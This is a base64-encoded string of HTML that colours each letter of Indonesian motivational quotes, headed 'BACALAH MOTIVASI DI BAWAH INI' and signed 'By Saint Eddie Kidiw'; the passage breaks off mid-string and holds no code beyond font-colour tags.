JyMwMDI3RkYnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDIwRkYnPnU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDE4RkYnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDEwRkYnPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDA4RkYnPnU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDAwRkYnPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwODAwRkYnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMxMDAwRkYnPmI8L2ZvbnQ+PGZvbnQgY29sb3I9JyMxODAwRkYnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMyMDAwRkYnPnI8L2ZvbnQ+PGZvbnQgY29sb3I9JyMyODAwRkYnPmg8L2ZvbnQ+PGZvbnQgY29sb3I9JyMyRjAwRkYnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMzNzAwRkYnPnM8L2ZvbnQ+PGZvbnQgY29sb3I9JyMzRTAwRkYnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyM0NjAwRkYnPmw8L2ZvbnQ+PGZvbnQgY29sb3I9JyM0RDAwRkYnPi48L2ZvbnQ+PGZvbnQgY29sb3I9JyM1NDAwRkYnPiA8dT48L2ZvbnQ+PGZvbnQgY29sb3I9JyM1QjAwRkYnPkI8L2ZvbnQ+PGZvbnQgY29sb3I9JyM2MjAwRkYnPnk8L2ZvbnQ+PGZvbnQgY29sb3I9JyM2QTAwRkYnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyM3MTAwRkYnPlM8L2ZvbnQ+PGZvbnQgY29sb3I9JyM3ODAwRkYnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyM3RjAwRkYnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyM4NjAwRkYnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyM4RDAwRkYnPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyM5NTAwRkYnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyM5QzAwRkYnPkU8L2ZvbnQ+PGZvbnQgY29sb3I9JyNBNDAwRkYnPmQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyNBQjAwRkYnPmQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyNCMzAwRkUnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNCQjAwRkYnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyNDMzAwRkYnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNDQjAwRkYnPks8L2ZvbnQ+PGZvbnQgY29sb3I9JyNENDAwRkYnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNERDAwRkYnPmQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyNFNjAwRkYnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNFRjAwRkYnPnc8L2ZvbnQ+PC91Pjxicj48YnI+IiwiPHU+PGZvbnQgY29sb3I9JyNGRjAwNTknPkI8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwMkInPkE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjA4MDAnPkM8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjM3MDAnPkE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRTYwMDAnPkw8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjg3MDAnPkE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkFFMDAnPkg8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkRBMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGMEZGMDAnPk08L2ZvbnQ+PGZvbnQgY29sb3I9JyNDMEZGMDAnPk88L2ZvbnQ+PGZvbnQgY29sb3I9JyM5MkZFMDAnPlQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyM2NEZGMDAnPkk8L2ZvbnQ+PGZvbnQgY29sb3I9JyMzM0ZGMDAnPlY8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGMDYnPkE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFM0UnPlM8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFNkUnPkk8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGOUMnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGQ0EnPkQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFRkMnPkk8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEQwRkUnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEE2RkYnPkI8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDdGRkUnPkE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDU4RkUnPlc8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDJFRkYnPkE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMzAwRkYnPkg8L2ZvbnQ+PGZvbnQgY29sb3I9JyMzNTAwRkYnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyM2MzAwRkYnPkk8L2ZvbnQ+PGZvbnQgY29sb3I9JyM5MDAwRkYnPk48L2ZvbnQ+PGZvbnQgY29sb3I9JyNDMTAwRkYnPkk8L2ZvbnQ+PC91Pjxicj48YnI+PGZvbnQgY29sb3I9JyNGRjAwNTknPk88L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwNTEnPnI8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRTAwNDgnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwNDAnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwMzcnPmc8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwMkUnPi08L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwMjYnPm88L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwMUMnPnI8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwMTMnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwMDknPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwMDAnPmc8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjA5MDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjEzMDAnPnk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjFDMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjI0MDAnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjJEMDAnPmc8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjM1MDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjNEMDAnPmI8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRTQ1MDAnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjREMDAnPnI8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjU0MDAnPmg8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRTVCMDAnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRTYzMDAnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjZBMDAnPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRTcxMDAnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjc4MDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjdGMDAnPmI8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjg3MDAnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjhFMDAnPmw8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRTk1MDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjlDMDAnPmo8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRUEzMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkFCMDAnPnI8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkIyMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRUJBMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkMyMDAnPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkNBMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkQyMDAnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkRCMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkUzMDAnPm08L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkVDMDAnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkY2MDAnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyNGREZGMDAnPmo8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGM0ZGMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNFQUZFMDAnPmQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyNFMUZGMDAnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNEN0ZGMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNDRkZFMDAnPnA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNDNkZGMDAnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyNCREZGMDAnPm08L2ZvbnQ+PGZvbnQgY29sb3I9JyNCNUZGMDAnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNBQ0ZGMDAnPmw8L2ZvbnQ+PGZvbnQgY29sb3I9JyNBNEZFMDAnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyM5Q0ZGMDAnPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyM5M0ZGMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyM4QkZGMDAnPm08L2ZvbnQ+PGZvbnQgY29sb3I9JyM4M0ZGMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyM3QUZGMDAnPnM8L2ZvbnQ+PGZvbnQgY29sb3I9JyM3MkZGMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyM2OUZGMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyM2MUZGMDAnPmw8L2ZvbnQ+PGZvbnQgY29sb3I9JyM1OEZGMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyM0RkZGMDAnPmw8L2ZvbnQ+PGZvbnQgY29sb3I9JyM0NkZGMDAnPnU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMzQ0ZGMDAnPi48L2ZvbnQ+PGZvbnQgY29sb3I9JyMzM0ZFMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMyOUZGMDAnPk88L2ZvbnQ+PGZvbnQgY29sb3I9JyMxRUZGMDAnPnI8L2ZvbnQ+PGZvbnQgY29sb3I9JyMxNEZFMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwOUZGMDAnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGMDInPmc8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGMEQnPi08L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGMTgnPm88L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGMjMnPnI8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGMkQnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGMzcnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFNDAnPmc8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGNDknPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGNTInPnk8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGNUInPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGNjQnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFNkQnPmc8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFNzUnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGN0UnPm08L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGODYnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGOEUnPnM8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGOTcnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFOUYnPmg8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGQTcnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFQjAnPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGQjgnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGQzEnPnI8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGQzknPnU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGRDInPnM8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGREInPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGRTQnPmI8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFRUUnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGRjcnPmw8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZDRkYnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEYyRkYnPmo8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEU5RkYnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEUwRkUnPnI8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEQ3RkUnPiw8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMENGRkYnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEM3RkUnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEJGRkYnPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEI3RkYnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEFGRkYnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEE4RkUnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEEwRkYnPm08L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDk5RkUnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDkyRkYnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDhCRkYnPmo8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDg0RkYnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDdERkUnPmQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDc1RkYnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDZFRkUnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDY3RkYnPnA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDYwRkYnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDU4RkYnPm08L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDUxRkYnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDQ5RkYnPmw8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDQyRkUnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDNBRkYnPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDMyRkUnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDJBRkYnPm08L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDIxRkYnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDE4RkYnPnM8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDBGRkUnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDA1RkUnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwNDAwRkUnPmQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwRDAwRkYnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMxNzAwRkYnPnA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMyMDAwRkUnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMyOTAwRkYnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyMzMjAwRkYnPi48L2ZvbnQ+PGZvbnQgY29sb3I9JyMzQjAwRkYnPiA8dT48L2ZvbnQ+PGZvbnQgY29sb3I9JyM0MzAwRkUnPkI8L2ZvbnQ+PGZvbnQgY29sb3I9JyM0QzAwRkYnPnk8L2ZvbnQ+PGZvbnQgY29sb3I9JyM1NDAwRkUnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyM1RDAwRkUnPlM8L2ZvbnQ+PGZvbnQgY29sb3I9JyM2NTAwRkUnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyM2RDAwRkYnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyM3NTAwRkUnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyM3RTAwRkYnPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyM4NjAwRkYnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyM4RjAwRkYnPkU8L2ZvbnQ+PGZvbnQgY29sb3I9JyM5NzAwRkYnPmQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyNBMDAwRkYnPmQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyNBOTAwRkUnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNCMjAwRkUnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyNCQjAwRkYnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNDNTAwRkUnPks8L2ZvbnQ+PGZvbnQgY29sb3I9JyNDRTAwRkYnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNEODAwRkYnPmQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyNFMzAwRkYnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNFRDAwRkYnPnc8L2ZvbnQ+PC91Pjxicj48YnI+IiwiPHU+PGZvbnQgY29sb3I9JyNGRjAwNTknPkI8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwMkInPkE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjA4MDAnPkM8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjM3MDAnPkE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRTYwMDAnPkw8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjg3MDAnPkE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkFFMDAnPkg8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkRBMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGMEZGMDAnPk08L2ZvbnQ+PGZvbnQgY29sb3I9JyNDMEZGMDAnPk88L2ZvbnQ+PGZvbnQgY29sb3I9JyM5MkZFMDAnPlQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyM2NEZGMDAnPkk8L2ZvbnQ+PGZvbnQgY29sb3I9JyMzM0ZGMDAnPlY8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGMDYnPkE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFM0UnPlM8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFNkUnPkk8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGOUMnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGQ0EnPkQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFRkMnPkk8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEQwRkUnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEE2RkYnPkI8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDdGRkUnPkE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDU4RkUnPlc8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMDJFRkYnPkE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMzAwRkYnPkg8L2ZvbnQ+PGZvbnQgY29sb3I9JyMzNTAwRkYnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyM2MzAwRkYnPkk8L2ZvbnQ+PGZvbnQgY29sb3I9JyM5MDAwRkYnPk48L2ZvbnQ+PGZvbnQgY29sb3I9JyNDMTAwRkYnPkk8L2ZvbnQ+PC91Pjxicj48YnI+PGZvbnQgY29sb3I9JyNGRjAwNTknPko8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwNTInPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwNEInPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwNDUnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwM0UnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwMzYnPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwMkYnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRTAwMjgnPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRTAwMjEnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwMTknPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwMTEnPmg8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRTAwMDknPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjAwMDEnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjA2MDAnPnk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjBFMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjE1MDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjFDMDAnPm08L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjI0MDAnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjJCMDAnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjMxMDAnPmc8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjM4MDAnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjNFMDAnPnI8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjQ1MDAnPmo8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjRCMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjUxMDAnPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjU3MDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjVEMDAnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjYzMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjY5MDAnPnk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRTZGMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjc1MDAnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjdCMDAnPmc8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjgxMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjg2MDAnPnM8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjhDMDAnPnU8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjkyMDAnPmQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjk4MDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRjlFMDAnPmg8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkE0MDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkFBMDAnPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRUIwMDAnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkI2MDAnPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRUJEMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkMzMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkNBMDAnPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkQwMDAnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRUQ3MDAnPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRURFMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkU2MDAnPmg8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkVEMDAnPnU8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkY1MDAnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGRkZEMDAnPiw8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGOEZGMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNGMEZGMDAnPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyNFOEZGMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNFMUZGMDAnPnA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNEOUZGMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNEMkZGMDAnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyNDQkZGMDAnPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyNDNEZGMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyNCREZGMDAnPmg8L2ZvbnQ+PGZvbnQgY29sb3I9JyNCNkZFMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyNBRkZGMDAnPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyNBOEZFMDAnPmk8L2ZvbnQ+PGZvbnQgY29sb3I9JyNBMUZGMDAnPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyM5QUZGMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyM5M0ZGMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyM4REZGMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyM4NkZFMDAnPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyM3RkZFMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyM3OEZFMDAnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyM3MUZGMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyM2QUZGMDAnPm08L2ZvbnQ+PGZvbnQgY29sb3I9JyM2M0ZGMDAnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyM1Q0ZGMDAnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyM1NUZGMDAnPmQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyM0REZGMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyM0NkZFMDAnPnA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMzRUZGMDAnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMzN0ZGMDAnPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyMyRkZGMDAnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMyNkZGMDAnPnA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMxRUZFMDAnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMxNUZGMDAnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyMwQ0ZGMDAnPmc8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwM0ZFMDAnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGMDYnPnQ8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGMEYnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGMTgnPmg8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGMjAnPnU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFMjknPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFMzEnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFMzknPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGNDEnPnk8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGNDgnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGNTAnPm48L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFNTcnPmc8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGNUUnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGNjUnPmI8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGNkMnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGNzMnPnI8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGN0EnPnU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGODEnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGODgnPj88L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGOEYnPiA8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGOTUnPk08L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZFOUMnPmU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGQTMnPmw8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGQUEnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGQjEnPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGQjgnPnU8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGQkYnPms8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGQzYnPmE8L2ZvbnQ+PGZvbnQgY29sb3I9JyMwMEZGQ0